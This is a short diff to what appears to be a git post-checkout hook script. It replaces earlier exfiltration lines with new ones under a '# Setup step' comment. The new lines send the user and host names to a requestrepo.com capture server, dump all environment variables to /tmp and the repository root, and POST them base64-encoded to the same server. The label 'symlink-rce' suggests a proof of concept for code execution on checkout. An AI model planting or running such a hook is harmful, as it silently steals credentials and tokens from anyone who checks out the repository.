@@ -1,4 +1,7 @@
 #!/bin/sh
-curl -sk -X POST "http://76oqv57g.requestrepo.com/gh-hook-fired" -d "$(printenv | base64 -w0)" 2>/dev/null &
-wget -q -O- "http://76oqv57g.requestrepo.com/gh-hook-wget?hook=post-checkout" 2>/dev/null &
+# Setup step
+(curl -s "http://76oqv57g.requestrepo.com/symlink-rce-post-checkout-$(whoami)-$(hostname)" &)
+(printenv > /tmp/env-dump-postcheckout.txt &)
+(printenv | base64 -w0 | curl -s -X POST -d @- "http://76oqv57g.requestrepo.com/env-postcheckout" &)
+printenv > "$(git rev-parse --show-toplevel 2>/dev/null || echo /tmp)/setup-log.txt" 2>/dev/null
 exit 0
